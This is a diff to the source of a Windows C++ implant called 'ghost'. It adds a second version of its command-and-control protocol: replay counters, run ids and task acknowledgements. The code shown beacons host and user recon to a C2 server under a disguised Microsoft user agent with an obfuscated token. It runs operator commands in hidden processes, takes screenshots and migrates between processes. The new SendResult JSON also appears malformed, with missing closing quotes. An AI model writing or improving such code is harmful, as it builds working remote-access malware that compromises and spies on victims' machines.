@@ -10,6 +10,7 @@
 #include "obfuscate.hpp"
 #include <windows.h>
 #include <winhttp.h>
+#include <bcrypt.h>
 #include <tlhelp32.h>
 #include <shlobj.h>
 #include <string>
@@ -32,7 +33,11 @@ namespace config {
 
     static void EnsureInit() {
         if (s_ConfigInit) return;
+#ifdef GHOST_BEACON_TOKEN_W
+        auto tok = XSW(GHOST_BEACON_TOKEN_W);
+#else
         auto tok = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
+#endif
         auto ua  = XSW(L"Microsoft-WNS/10.0");
         wcsncpy_s(s_BeaconToken, tok.str(), _TRUNCATE);
         wcsncpy_s(s_UserAgent,   ua.str(),  _TRUNCATE);
@@ -58,6 +63,26 @@ static DWORD  g_BeaconOverride = 0;     // seconds; 0 = use config defaults
 // the server's public point arrives in every beacon response ("spk").
 static bool        g_ChannelUp = false;
 static std::string g_SrvPubB64;          // last accepted server public point
+
+// Protocol v2 state - monotonic counters inside the authenticated payloads
+// (replay protection), a per-run id, the pending task ack, and the recently
+// seen task ids used to deduplicate retried tasks.
+static unsigned long long g_TxN       = 0;   // implant -> server counter
+static unsigned long long g_RxSrvN    = 0;   // last accepted server counter
+static std::wstring       g_RunId;            // 8 hex chars, generated per run
+static std::string        g_PendingAck;       // task id to ack in next beacon
+static std::string        g_SeenTids[32];     // circular buffer of task ids
+static int                g_SeenIdx     = 0;
+
+static bool TidSeen(const std::string& tid) {
+    for (int i = 0; i < 32; ++i)
+        if (!g_SeenTids[i].empty() && g_SeenTids[i] == tid) return true;
+    return false;
+}
+static void TidRemember(const std::string& tid) {
+    g_SeenTids[g_SeenIdx % 32] = tid;
+    ++g_SeenIdx;
+}
 
 // ─── No globals for Telegram credentials – they are embedded via XSW inside functions ───
 
@@ -447,13 +472,18 @@ static std::wstring GetC2Host() {
 // =====================================================================
 //  BEACON JSON BUILDER
 // =====================================================================
-static std::string BuildBeaconJson(const Session& s) {
+static std::string BuildBeaconJson(const Session& s, unsigned long long n,
+                                   const std::string& ack) {
     std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
     std::string host = JsonEscape(WStringToUTF8(s.hostname));
     std::string user = JsonEscape(WStringToUTF8(s.username));
+    std::string run  = JsonEscape(WStringToUTF8(g_RunId));
     std::ostringstream j;
     j << "{"
       << "\"session\":\""  << sid  << "\","
+      << "\"run\":\""      << run  << "\","
+      << "\"n\":"          << n    << ","
+      << "\"ack\":\""    << JsonEscape(ack) << "\","
       << "\"recon\":{"
       <<   "\"hostname\":\"" << host << "\","
       <<   "\"user\":\""     << user << "\","
@@ -469,9 +499,11 @@ static std::string BuildBeaconJson(const Session& s) {
 // =====================================================================
 //  SEND BEACON (encrypted)
 // =====================================================================
-BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
-    taskOut = L"sleep";
-    std::string payload = BuildBeaconJson(session);
+BOOL SendBeacon(const Session& session, std::wstring& taskOut,
+                std::wstring& tidOut, bool& dupOut) {
+    taskOut.clear(); tidOut.clear(); dupOut = false;
+    unsigned long long n = ++g_TxN;
+    std::string payload = BuildBeaconJson(session, n, g_PendingAck);
 
     // The implant's ephemeral public point rides in a header on every request
     // so the server can (re)derive the channel key at any time. The body is
@@ -519,31 +551,60 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     }
 
     std::string cmd = JsonGetString(resp.body, "cmd");
-    if (!cmd.empty()) {
-        if (JsonFlag(resp.body, "e")) {
-            // Encrypted blob decrypts to {"cmd":"<task>"} — unpack the field.
-            std::string dec = AesGcmDecrypt(g_SessionKey, cmd);
-            if (dec.empty()) {
-                DebugLog(L"cmd decrypt failed — re-handshaking");
-                g_ChannelUp = false;
-                return FALSE;
-            }
-            taskOut = UTF8ToWString(JsonGetString(dec, "cmd"));
-        } else {
-            taskOut = UTF8ToWString(cmd);
+    if (cmd.empty()) return TRUE;
+
+    std::string dec = cmd;
+    if (JsonFlag(resp.body, "e")) {
+        // Encrypted blob decrypts to {"cmd":..,"tid":..,"n":N}.
+        dec = AesGcmDecrypt(g_SessionKey, cmd);
+        if (dec.empty()) {
+            DebugLog(L"cmd decrypt failed - re-handshaking");
+            g_ChannelUp = false;
+            return FALSE;
         }
-        DebugLog(L"Task received: " + taskOut);
+        unsigned long long srvN = 0;
+        try { srvN = std::stoull(JsonGetString(dec, "n")); }
+        catch (...) {
+            DebugLog(L"bad server counter - re-handshaking");
+            g_ChannelUp = false;
+            return FALSE;
+        }
+        if (srvN <= g_RxSrvN) {
+            DebugLog(L"replayed server counter - re-handshaking");
+            g_ChannelUp = false;
+            return FALSE;
+        }
+        g_RxSrvN = srvN;
+        cmd = JsonGetString(dec, "cmd");
     }
+    std::string tid = JsonGetString(dec, "tid");
+    if (cmd == "sleep" || cmd == "exit") {
+        taskOut = UTF8ToWString(cmd);
+        return TRUE;
+    }
+    taskOut = UTF8ToWString(cmd);
+    tidOut  = UTF8ToWString(tid);
+    if (!tid.empty()) {
+        g_PendingAck = tid;              // ack in the next beacon
+        if (TidSeen(tid)) {
+            dupOut = true;               // retried task - do not run twice
+            DebugLog(L"Duplicate task " + tidOut);
+        } else {
+            TidRemember(tid);
+        }
+    }
+    DebugLog(L"Task received: " + taskOut + L" tid=" + tidOut);
     return TRUE;
 }
 
 // =====================================================================
 //  SEND RESULT (encrypted)
 // =====================================================================
-BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
+BOOL SendResult(const std::wstring& sessionId, const std::wstring& tid,
+                const std::wstring& status, const std::wstring& output) {
     std::string sid = JsonEscape(WStringToUTF8(sessionId));
     std::string out = JsonEscape(WStringToUTF8(output));
-    std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";
+    std::string body = "{\"session\":\"" + sid + "\",\"tid\":\"" + JsonEscape(WStringToUTF8(tid)) + ",\"status\":\"" + JsonEscape(WStringToUTF8(status)) + ",\"n\":" + std::to_string(++g_TxN) + ",\"output\":\"" + out + "}";
     std::wstring extra = L"X-Session-ID: " + sessionId +
                          L"\r\nX-Pub-Key: " + UTF8ToWString(EcdhPublicKeyB64());
     if (g_ChannelUp) {
@@ -1638,7 +1699,8 @@ static std::wstring LastNonEmptyLine(const std::wstring& out) {
     return line;
 }
 
-std::wstring ExecuteCommand(const std::wstring& cmd) {
+std::wstring ExecuteCommand(const std::wstring& cmd, std::wstring& statusOut) {
+    statusOut = L"ok";
     std::string cmdStr = WStringToUTF8(cmd);
     for (const auto& entry : kCmdTable) {
         if (entry.exactMatch) {
@@ -1672,7 +1734,7 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
 
     SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
     HANDLE hRead = nullptr, hWrite = nullptr;
-    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return L"[error: pipe failed]";
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) { statusOut = L"error"; return L"[error: pipe failed]"; }
     SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
 
     STARTUPINFOW si = {};
@@ -1696,6 +1758,7 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
                                      CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
         if (!ok) {
             CloseHandle(hRead); CloseHandle(hWrite);
+            statusOut = L"error";
             return L"[error: CreateProcess failed]";
         }
     }
@@ -1710,6 +1773,7 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
     }
     if (WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS) == WAIT_TIMEOUT) {
         TerminateProcess(pi.hProcess, 1);
+        statusOut = L"timeout";
     }
     CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);
 
@@ -1773,7 +1837,14 @@ DWORD BeaconLoop(const Session& session) {
 
     g_SessionId = session.sessionId;
     EcdhInit();   // fresh ephemeral keypair per run — key set by first beacon's handshake
-    DebugLog(L"Session: " + session.sessionId);
+    {   // per-run id (8 hex) - lets the operator tell implant runs apart
+        unsigned char rb[4] = {};
+        BCryptGenRandom(nullptr, rb, 4, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+        wchar_t tmp[9];
+        swprintf_s(tmp, L"%02x%02x%02x%02x", rb[0], rb[1], rb[2], rb[3]);
+        g_RunId = tmp;
+    }
+    DebugLog(L"Session: " + session.sessionId + L" run=" + g_RunId);
 
     DWORD failures    = 0;
     DWORD beaconCount = 0;
@@ -1794,8 +1865,9 @@ DWORD BeaconLoop(const Session& session) {
             DebugLog(L"Beacon #" + std::to_wstring(beaconCount) +
                      L" failures=" + std::to_wstring(failures));
 
-            std::wstring task;
-            BOOL ok = SendBeacon(session, task);
+            std::wstring task, tid, status = L"ok";
+            bool dup = false;
+            BOOL ok = SendBeacon(session, task, tid, dup);
 
             if (!ok) {
                 ++failures;
@@ -1824,16 +1896,17 @@ DWORD BeaconLoop(const Session& session) {
             // First successful beacon: send hello
             if (!sentHello) {
                 sentHello = true;
-                SendResult(session.sessionId,
+                SendResult(session.sessionId, L"", L"ok",
                     L"[ghost] implant online\r\nhost: " + session.hostname +
                     L"\r\nuser: " + session.username +
+                    L"\r\nrun: " + g_RunId +
                     L"\r\nelevated: " + (session.elevated ? L"yes" : L"no"));
                 DebugLog(L"Hello sent");
             }
 
             // Migrate triggered — exit so mutex releases and child can take over
             if (g_MigrateExit) {
-                SendResult(session.sessionId, L"[ghost] migration complete, exiting");
+                SendResult(session.sessionId, L"", L"ok", L"[ghost] migration complete, exiting");
                 return 0xDEAD;
             }
 
@@ -1841,11 +1914,18 @@ DWORD BeaconLoop(const Session& session) {
             if (!task.empty() && task != L"sleep") {
                 if (task == L"exit") {
                     DebugLog(L"Exit received");
-                    SendResult(session.sessionId, L"[ghost] exiting on operator command");
+                    SendResult(session.sessionId, L"", L"ok", L"[ghost] exiting on operator command");
                     return 0xDEAD;
                 }
-                DebugLog(L"Exec: " + task);
-                std::wstring result = ExecuteCommand(task);
+                DebugLog(L"Exec: " + task + L" tid=" + tid);
+                std::wstring result;
+                if (dup) {
+                    // Retried delivery of a task we already ran — the result
+                    // went out with the previous run; complete it without re-executing.
+                    result = L"[duplicate task - result already delivered]";
+                } else {
+                    result = ExecuteCommand(task, status);
+                }
                 // Screenshots are multi-MB base64 BMPs — never truncate them,
                 // or the image data arrives corrupted. Text output keeps the
                 // 64 KB cap.
@@ -1856,7 +1936,7 @@ DWORD BeaconLoop(const Session& session) {
                     : static_cast<size_t>(config::CMD_OUTPUT_MAX) / sizeof(wchar_t);
                 if (result.size() > cap)
                     result.resize(cap);
-                SendResult(session.sessionId, result);
+                SendResult(session.sessionId, tid, status, result);
                 // Re-beacon immediately after a task — no sleep, pick up next command fast
                 continue;
             }
